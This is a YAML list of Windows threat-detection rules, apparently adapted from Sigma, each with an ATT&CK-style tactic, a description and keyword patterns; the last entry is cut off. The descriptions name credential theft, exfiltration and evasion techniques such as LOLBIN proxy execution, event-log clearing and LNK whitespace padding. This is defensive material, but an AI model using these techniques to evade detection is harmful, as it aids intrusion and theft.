- id: sigma_835e75bf_4bfd_47a4_b8a6_b766cac8bcb7
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects uncommon child process of Setres.EXE.

    Setres.EXE is a Windows server only process and tool that can be used to set the
    screen resolution.

    It can potentially be abused in order to launch any arbitrary file with a name
    containing the word "choice" from the current execution path.

    '
  conditions:
    summary:
      regex_any:
      - uncommon
      - child
      - process
      - setres
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1eeed653_dbc8_4187_ad0c_eeebb20e6599
  intent: credential_harvesting
  tactic: credential_access
  description: Detects service principal name (SPN) enumeration used for Kerberoasting
  conditions:
    summary:
      regex_any:
      - potential
      - enumeration
      - setspn
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_99c8be4f_3087_4f9f_9c24_8c7e257b442e
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of "Setup16.EXE" and old installation utility
    with a custom ".lst" file.

    These ".lst" file can contain references to external program that "Setup16.EXE"
    will execute.

    Attackers and adversaries might leverage this as a living of the land utility.

    '
  conditions:
    summary:
      regex_any:
      - setup16
      - execution
      - with
      - custom
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_34ebb878_1b15_4895_b352_ca2eeb99b274
  intent: impact_operations
  tactic: impact
  description: Use of the commandline to shutdown or reboot windows
  conditions:
    summary:
      regex_any:
      - suspicious
      - execution
      - shutdown
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ec290c06_9b6b_4338_8b6b_095c0f284f10
  intent: impact_operations
  tactic: impact
  description: Detects the rare use of the command line tool shutdown to logoff a
    user
  conditions:
    summary:
      regex_any:
      - suspicious
      - execution
      - shutdown
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7d4aaec2_08ed_4430_8b96_28420e030e04
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects uncommon child processes spawning from "sigverif.exe", which
    could indicate potential abuse of the latter as a living of the land binary in
    order to proxy execution.

    '
  conditions:
    summary:
      regex_any:
      - uncommon
      - sigverif
      - child
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ba42babc_0666_4393_a4f7_ceaf5a69191e
  intent: execution
  tactic: execution
  description: Detects potentially uncommon child processes of SndVol.exe (the Windows
    volume mixer)
  conditions:
    summary:
      regex_any:
      - uncommon
      - child
      - processes
      - sndvol
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_83865853_59aa_449e_9600_74b9d89a6d6e
  intent: data_staging
  tactic: collection
  description: Detect attacker collecting audio via SoundRecorder application.
  conditions:
    summary:
      regex_any:
      - audio
      - capture
      - soundrecorder
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_78f10490_f2f4_4d19_a75b_4e0683bf3b8d
  intent: lateral_movement
  tactic: lateral_movement
  description: 'Detects suspicious Speech Runtime Binary Execution by monitoring its
    child processes.

    Child processes spawned by SpeechRuntime.exe could indicate an attempt for lateral
    movement via COM & DCOM hijacking.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - speech
      - runtime
      - binary
      - child
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1f1a8509_2cbb_44f5_8751_8e1571518ce2
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious Splwow64.exe process without any command line parameters
  conditions:
    summary:
      regex_any:
      - suspicious
      - splwow64
      - without
      - params
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dcdbc940_0bff_46b2_95f3_2d73f848e33b
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects suspicious print spool service (spoolsv.exe) child processes.
  conditions:
    summary:
      regex_any:
      - suspicious
      - spool
      - service
      - child
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_696bfb54_227e_4602_ac5b_30d9d2053312
  intent: data_staging
  tactic: collection
  description: Detects potentially suspicious SQL queries using SQLCmd targeting the
    Veeam backup databases in order to steal information.
  conditions:
    summary:
      regex_any:
      - veeam
      - backup
      - database
      - suspicious
      - query
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b57ba453_b384_4ab9_9f40_1038086b4e53
  intent: data_staging
  tactic: collection
  description: Detects dump of credentials in VeeamBackup dbo
  conditions:
    summary:
      regex_any:
      - veeambackup
      - database
      - credentials
      - dump
      - sqlcmd
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_24c77512_782b_448a_8950_eddb0785fc71
  intent: data_staging
  tactic: collection
  description: Detect usage of the "sqlite" binary to query databases in Chromium-based
    browsers for potential data stealing.
  conditions:
    summary:
      regex_any:
      - sqlite
      - chromium
      - profile
      - data
      - access
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4833155a_4053_4c9c_a997_777fcea0baa7
  intent: data_staging
  tactic: collection
  description: Detect usage of the "sqlite" binary to query databases in Firefox and
    other Gecko-based browsers for potential data stealing.
  conditions:
    summary:
      regex_any:
      - sqlite
      - firefox
      - profile
      - data
      - access
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1e75c1cc_c5d4_42aa_ac3d_91b0b68b3b4c
  intent: execution
  tactic: execution
  description: 'Detects the usage of the "Squirrel.exe" to download arbitrary files.
    This binary is part of multiple Electron based software installations (Slack,
    Teams, Discord, etc.)

    '
  conditions:
    summary:
      regex_any:
      - arbitrary
      - file
      - download
      - squirrel
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_45239e6a_b035_4aaf_b339_8ad379fcb67e
  intent: execution
  tactic: execution
  description: 'Detects the usage of the "Squirrel.exe" binary to execute arbitrary
    processes. This binary is part of multiple Electron based software installations
    (Slack, Teams, Discord, etc.)

    '
  conditions:
    summary:
      regex_any:
      - process
      - proxy
      - execution
      - squirrel
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_327f48c1_a6db_4eb8_875a_f6981f1b0183
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects port forwarding activity via SSH.exe
  conditions:
    summary:
      regex_any:
      - port
      - forwarding
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7d6d30b8_5b91_4b90_a891_46cccaf29598
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect usage of the "ssh.exe" binary as a proxy to launch other programs.
  conditions:
    summary:
      regex_any:
      - program
      - executed
      - using
      - proxy
      - local
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f7d7ebd5_a016_46e2_9c54_f9932f2d386d
  intent: command_and_control_setup
  tactic: command_and_control
  description: Execution of ssh.exe to perform data exfiltration and tunneling through
    RDP
  conditions:
    summary:
      regex_any:
      - potential
      - tunneling
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d20ee2f4_822c_4827_9e15_41500b1fff10
  intent: persistence_installation
  tactic: persistence
  description: Detects potential Amazon SSM agent hijack attempts as outlined in the
    Mitiga research report.
  conditions:
    summary:
      regex_any:
      - potential
      - amazon
      - agent
      - hijacking
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_961e0abb_1b1e_4c84_a453_aafe56ad0d34
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the use of stordiag.exe to execute schtasks.exe systeminfo.exe
    and fltmc.exe
  conditions:
    summary:
      regex_any:
      - execution
      - stordiag
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_16905e21_66ee_42fe_b256_1318ada2d770
  intent: defense_evasion
  tactic: defense_evasion
  description: Ntvdm.exe allows the execution of 16-bit Windows applications on 32-bit
    Windows operating systems, as well as the execution of both 16-bit and 32-bit
    DOS applications
  conditions:
    summary:
      regex_any:
      - start
      - virtual
      - machine
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d522eca2_2973_4391_a3e0_ef0374321dae
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detection of unusual child processes by different system processes
  conditions:
    summary:
      regex_any:
      - abused
      - debug
      - privilege
      - arbitrary
      - parent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ad720b90_25ad_43ff_9b5e_5c841facc8e5
  intent: persistence_installation
  tactic: persistence
  description: Detects addition of users to the local administrator group via "Net"
    or "Add-LocalGroupMember".
  conditions:
    summary:
      regex_any:
      - user
      - added
      - local
      - administrators
      - group
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_10fb649c_3600_4d37_b1e6_56ea90bb7e09
  intent: persistence_installation
  tactic: persistence
  description: Detects addition of users to highly privileged groups via "Net" or
    "Add-LocalGroupMember".
  conditions:
    summary:
      regex_any:
      - user
      - added
      - highly
      - privileged
      - group
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ffa28e60_bdb1_46e0_9f82_05f7a61cc06e
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects addition of users to the local Remote Desktop Users group via
    "Net" or "Add-LocalGroupMember".
  conditions:
    summary:
      regex_any:
      - user
      - added
      - remote
      - desktop
      - users
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7f43c430_5001_4f8b_aaa9_c3b88f18fa5c
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution from an Alternate Data Stream (ADS). Adversaries
    may use NTFS file attributes to hide their malicious data in order to evade detection
  conditions:
    summary:
      regex_any:
      - execute
      - from
      - alternate
      - data
      - streams
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cd951fdc_4b2f_47f5_ba99_a33bf61e3770
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects Windows Installer service (msiexec.exe) trying to install MSI
    packages with SYSTEM privilege
  conditions:
    summary:
      regex_any:
      - always
      - install
      - elevated
      - windows
      - installer
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f91ed517_a6ba_471d_9910_b3b4a398c0f3
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potentially suspicious child process of applications launched
    from inside the WindowsApps directory. This could be a sign of a rogue ".appx"
    package installation/execution
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - windows
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_24de4f3b_804c_4165_b442_5a06a2302c7e
  intent: unknown
  tactic: initial_access
  description: The .SettingContent-ms file type was introduced in Windows 10 and allows
    a user to create "shortcuts" to various Windows 10 setting pages. These files
    are simply XML and contain paths to various Windows 10 settings binaries.
  conditions:
    summary:
      regex_any:
      - arbitrary
      - shell
      - command
      - execution
      - settingcontent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fcdf69e5_a3d3_452a_9724_26f2308bf2b1
  intent: unknown
  tactic: initial_access
  description: Detects cases in which an ISO files is opend within an archiver like
    7Zip or Winrar, which is a sign of phishing as threat actors put small ISO files
    in archives as email attachments to bypass certain filters and protective measures
    (mark of web)
  conditions:
    summary:
      regex_any:
      - phishing
      - pattern
      - archive
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f576a613_2392_4067_9d1a_9345fb58d8d1
  intent: credential_harvesting
  tactic: credential_access
  description: Once established within a system or network, an adversary may use automated
    techniques for collecting internal data.
  conditions:
    summary:
      regex_any:
      - automated
      - collection
      - command
      - prompt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a7c3d773_caef_227e_a7e7_c2f13c622329
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects attackers using tooling with bad opsec defaults.

    E.g. spawning a sacrificial process to inject a capability into the process without
    taking into account how the process is normally run.

    One trivial example of this is using rundll32.exe without arguments as a sacrificial
    process (default in CS, now highlighted by c2lint), running WerFault without arguments
    (Kraken - credit am0nsec), and other examples.

    '
  conditions:
    summary:
      regex_any:
      - opsec
      - defaults
      - sacrificial
      - processes
      - with
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1193d960_2369_499f_a158_7b50a31df682
  intent: execution
  tactic: execution
  description: 'Detects when a browser process or browser tab is launched from an
    application that handles document files such as Adobe, Microsoft Office, etc.
    And connects to a web application over http(s), this could indicate a possible
    phishing attempt.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - suspicious
      - browser
      - launch
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_590a5f4c_6c8c_4f10_8307_89afe9453a9d
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detection of child processes spawned with SYSTEM privileges by parents
    with LOCAL SERVICE or NETWORK SERVICE accounts
  conditions:
    summary:
      regex_any:
      - suspicious
      - child
      - process
      - created
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f0cdd048_82dc_4f7a_8a7a_b87a52b6d0fd
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potential commandline obfuscation using known escape characters
  conditions:
    summary:
      regex_any:
      - potential
      - commandline
      - obfuscation
      - using
      - escape
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_584bca0f_3608_4402_80fd_4075ff6072e3
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects potential commandline obfuscation using unicode characters.

    Adversaries may attempt to make an executable or file difficult to discover or
    analyze by encrypting, encoding, or otherwise obfuscating its contents on the
    system or in transit.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - commandline
      - obfuscation
      - using
      - unicode
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1327381e_6ab0_4f38_b583_4c1b8346a56b
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potential evasion or obfuscation attempts using bogus path
    traversal via the commandline
  conditions:
    summary:
      regex_any:
      - potential
      - command
      - line
      - path
      - traversal
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_47147b5b_9e17_4d76_b8d2_7bac24c5ce1b
  intent: credential_harvesting
  tactic: credential_access
  description: 'Adversaries may acquire credentials from web browsers by reading files
    specific to the target browser.

    Web browsers commonly save credentials such as website usernames and passwords
    so that they do not need to be entered manually in the future.

    Web browsers typically store the credentials in an encrypted format within a credential
    store.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - browser
      - data
      - stealing
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_855bc8b5_2ae8_402e_a9ed_b889e6df1900
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects a copy command or a copy utility execution to or from an Admin
    share or remote
  conditions:
    summary:
      regex_any:
      - copy
      - from
      - admin
      - share
      - sysvol
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fff9d2b7_e11c_4a69_93d3_40ef66189767
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects a suspicious copy operation that tries to copy a program from
    system (System32, SysWOW64, WinSxS) directories to another on disk.

    Often used to move LOLBINs such as ''certutil'' or ''desktopimgdownldr'' to a
    different location with a different name in order to bypass detections based on
    locations.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - copy
      - from
      - system
      - directory
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f5d19838_41b5_476c_98d8_ba8af4929ee2
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects a suspicious copy operation that tries to copy a known LOLBIN
    from system (System32, SysWOW64, WinSxS) directories to another on disk in order
    to bypass detections based on locations.

    '
  conditions:
    summary:
      regex_any:
      - binary
      - copied
      - from
      - system
      - directory
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_66c3b204_9f88_4d0a_a7f7_8a57d521ca55
  intent: impact_operations
  tactic: impact
  description: Detects command line parameters or strings often used by crypto miners
  conditions:
    summary:
      regex_any:
      - potential
      - crypto
      - mining
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7d1aaf3d_4304_425c_b7c3_162055e0b3ab
  intent: execution
  tactic: execution
  description: Detects the use of various CLI utilities exfiltrating data via web
    requests
  conditions:
    summary:
      regex_any:
      - potential
      - data
      - exfiltration
      - activity
      - commandline
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a31eeaed_3fd5_478e_a8ba_e62c6b3f9ecc
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects commands that indicate a Raccine removal from an end system.
    Raccine is a free ransomware protection tool.
  conditions:
    summary:
      regex_any:
      - raccine
      - uninstall
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1cdd9a09_06c9_4769_99ff_626e2b3991b8
  intent: unknown
  tactic: initial_access
  description: Detects suspicious use of an .exe extension after a non-executable
    file extension like .pdf.exe, a set of spaces or underlines to cloak the executable
    file in spear phishing campaigns
  conditions:
    summary:
      regex_any:
      - suspicious
      - double
      - extension
      - file
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5e6a80c8_2d45_4633_9ef4_fa2671a39c5c
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect execution of suspicious double extension files in ParentCommandLine
  conditions:
    summary:
      regex_any:
      - suspicious
      - parent
      - double
      - extension
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_00d49ed5_4491_4271_a8db_650a4ef6f8c1
  intent: unknown
  tactic: resource_development
  description: Detects suspicious ways to download files from Microsoft domains that
    are used to store attachments in Emails or OneNote documents
  conditions:
    summary:
      regex_any:
      - suspicious
      - download
      - from
      - office
      - domain
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4f647cfa_b598_4e12_ad69_c68dd16caef8
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the use of the filename DumpStack.log to evade Microsoft Defender
  conditions:
    summary:
      regex_any:
      - dumpstack
      - defender
      - evasion
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1e53dd56_8d83_4eb4_a43e_b790a05510aa
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects Windows Installer service (msiexec.exe) spawning "cmd" or "powershell"
  conditions:
    summary:
      regex_any:
      - always
      - install
      - elevated
      - spawned
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f26eb764_fd89_464b_85e2_dc4a8e6e77b8
  intent: execution
  tactic: execution
  description: 'Detects suspicious child processes of electron apps (teams, discord,
    slack, etc.). This could be a potential sign of ".asar" file tampering (See reference
    section for more information) or binary execution proxy through specific CLI arguments
    (see related rule)

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - electron
      - application
      - child
      - processes
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_378a05d8_963c_46c9_bcce_13c7657eac99
  intent: execution
  tactic: execution
  description: Detects potentially suspicious CommandLine of electron apps (teams,
    discord, slack, etc.). This could be a sign of abuse to proxy execution through
    a signed binary.
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - electron
      - application
      - commandline
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_178e615d_e666_498b_9630_9ed363038101
  intent: execution
  tactic: execution
  description: Detects when a shell program such as the Windows command prompt or
    PowerShell is launched with system privileges from a uncommon parent location.
  conditions:
    summary:
      regex_any:
      - elevated
      - system
      - shell
      - spawned
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_30e92f50_bb5a_4884_98b5_d20aa80f3d7a
  intent: execution
  tactic: execution
  description: Detects events that appear when a user click on a link file with a
    powershell command in it
  conditions:
    summary:
      regex_any:
      - hidden
      - powershell
      - link
      - file
      - pattern
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4a30ac0c_b9d6_4e01_b71a_5f851bbf4259
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the usage of emojis in the command line, this could be a sign
    of potential defense evasion activity.
  conditions:
    summary:
      regex_any:
      - potential
      - defense
      - evasion
      - activity
      - emoji
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c98f2a0d_e1b8_4f76_90d3_359caf88d6b9
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the usage of emojis in the command line, this could be a sign
    of potential defense evasion activity.
  conditions:
    summary:
      regex_any:
      - potential
      - defense
      - evasion
      - activity
      - emoji
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f9578658_9e71_4711_b634_3f9b50cd3c06
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the usage of emojis in the command line, this could be a sign
    of potential defense evasion activity.
  conditions:
    summary:
      regex_any:
      - potential
      - defense
      - evasion
      - activity
      - emoji
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_225274c4_8dd1_40db_9e09_71dff4f6fb3c
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the usage of emojis in the command line, this could be a sign
    of potential defense evasion activity.
  conditions:
    summary:
      regex_any:
      - potential
      - defense
      - evasion
      - activity
      - emoji
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_41421f44_58f9_455d_838a_c398859841d4
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects changes to environment variables related to ETW logging via
    the CommandLine.

    This could indicate potential adversaries stopping ETW providers recording loaded
    .NET assemblies.

    '
  conditions:
    summary:
      regex_any:
      - logging
      - tamper
      - processes
      - commandline
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a238b5d0_ce2d_4414_a676_7a531b3d13d6
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects command line activity that tries to clear or disable any ETW
    trace log which could be a sign of logging evasion.

    '
  conditions:
    summary:
      regex_any:
      - trace
      - evasion
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cc36992a_4671_4f21_a91d_6c2b72a2edf5
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the clearing or configuration tampering of EventLog using
    utilities such as "wevtutil", "powershell" and "wmic".

    This technique were seen used by threat actors and ransomware strains in order
    to evade defenses.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - eventlog
      - clearing
      - configuration
      - change
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_beaa66d6_aa1b_4e3c_80f5_e0145369bfaf
  intent: reconnaissance
  tactic: discovery
  description: 'Detects execution of different log query utilities and commands to
    search and dump the content of specific event logs or look for specific event
    IDs.

    This technique is used by threat actors in order to extract sensitive information
    from events logs such as usernames, IP addresses, hostnames, etc.

    '
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - eventlog
      - recon
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_69bd9b97_2be2_41b6_9816_fb08757a4d1a
  intent: execution
  tactic: execution
  description: 'Detects a potentially suspicious execution of a parent process located
    in the "\Users\Public" folder executing a child process containing references
    to shell or scripting binaries and commandlines.

    '
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - execution
      - from
      - parent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3dfd06d2_eaf4_4532_9555_68aca59f57c4
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a potentially suspicious execution from an uncommon folder.
  conditions:
    summary:
      regex_any:
      - process
      - execution
      - from
      - potentially
      - suspicious
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9637e8a5_7131_4f7f_bdc7_2b05d8670c43
  intent: execution
  tactic: execution
  description: Detects Executables in the Downloads folder without FileVersion,Description,Product,Company
    likely created with py2exe
  conditions:
    summary:
      regex_any:
      - suspicious
      - file
      - characteristics
      - missing
      - fields
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_07aa184a_870d_413d_893a_157f317f6f58
  intent: execution
  tactic: execution
  description: Detects execution of the built-in script located in "C:\Windows\System32\gatherNetworkInfo.vbs".
    Which can be used to gather information about the target machine
  conditions:
    summary:
      regex_any:
      - suspicious
      - reconnaissance
      - activity
      - gathernetworkinfo
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0900463c_b33b_49a8_be1d_552a3b553dae
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects command line containing reference to the "::$index_allocation"
    stream, which can be used as a technique to prevent access to folders or files
    from tooling such as "explorer.exe" or "powershell.exe"

    '
  conditions:
    summary:
      regex_any:
      - potential
      - hidden
      - directory
      - creation
      - ntfs
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ae9b0bd7_8888_4606_b444_0ed7410cb728
  intent: execution
  tactic: execution
  description: Monitors for the hiding possible malicious files in the C:\Windows\Fonts\
    location. This folder doesn't require admin privillege to be written and executed
    from.
  conditions:
    summary:
      regex_any:
      - writing
      - malicious
      - files
      - fonts
      - folder
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_32e280f1_8ad4_46ef_9e80_910657611fbc
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the presence of unicode characters which are homoglyphs, or
    identical in appearance, to ASCII letter characters.

    This is used as an obfuscation and masquerading techniques. Only "perfect" homoglyphs
    are included; these are characters that

    are indistinguishable from ASCII characters and thus may make excellent candidates
    for homoglyph attack characters.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - homoglyph
      - attack
      - using
      - lookalike
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_71158e3f_df67_472b_930e_7d287acaa3e1
  intent: defense_evasion
  tactic: defense_evasion
  description: Checks whether the image specified in a process creation event is not
    a full, absolute path (caused by process ghosting or other unorthodox methods
    to start a process)
  conditions:
    summary:
      regex_any:
      - execution
      - existing
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_22e58743_4ac8_4a9f_bf19_00a0428d8c5f
  intent: execution
  tactic: execution
  description: Detects encoded base64 MZ header in the commandline
  conditions:
    summary:
      regex_any:
      - base64
      - header
      - commandline
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8537c866_072e_460d_bfff_aaf39cbd73d3
  intent: execution
  tactic: execution
  description: Detects potentially suspicious inline JavaScript execution using Node.js
    with specific keywords in the command line.
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - inline
      - javascript
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ba3f5c1b_6272_4119_9dbd_0bc8d21c2702
  intent: execution
  tactic: execution
  description: Detects the use of WinAPI Functions via the commandline. As seen used
    by threat actors via the tool winapiexec
  conditions:
    summary:
      regex_any:
      - potential
      - winapi
      - calls
      - commandline
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6d3a3952_6530_44a3_8554_cf17c116c615
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects potentially suspicious search for JWT tokens via CLI by looking
    for the string "eyJ0eX" or "eyJhbG".

    JWT tokens are often used for access-tokens across various applications and services
    like Microsoft 365, Azure, AWS, Google Cloud, and others.

    Threat actors may search for these tokens to steal them for lateral movement or
    privilege escalation.

    '
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - token
      - search
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dd8756e7_a3a0_4768_b47e_8f545d1a751c
  intent: execution
  tactic: execution
  description: 'Detects exploitation of LNK file command-line length discrepancy,
    where attackers hide malicious commands beyond the 260-character UI limit while
    the actual command-line argument field supports 4096 characters using whitespace
    padding (e.g., 0x20, 0x09-0x0D).

    Adversaries insert non-printable whitespace characters (e.g., Line Feed \x0A,
    Carriage Return \x0D) to pad the visible section of the LNK file, pushing malicious
    commands past the UI-visible boundary.

    The hidden payload, executed at runtime but invisible in Windows Explorer properties,
    enables stealthy execution and evasioncommonly used for social engineering attacks.

    This rule flags suspicious use of such padding observed in real-world attacks.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - command
      - line
      - padding
      - with
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d4ca7c59_e9e4_42d8_bf57_91a776efcb87
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects LOLBINs executing from an abnormal or uncommon drive such as
    a mounted ISO.
  conditions:
    summary:
      regex_any:
      - lolbin
      - execution
      - from
      - abnormal
      - drive
  weights:
    base: 0.6
    indicators_bonus: 0.1
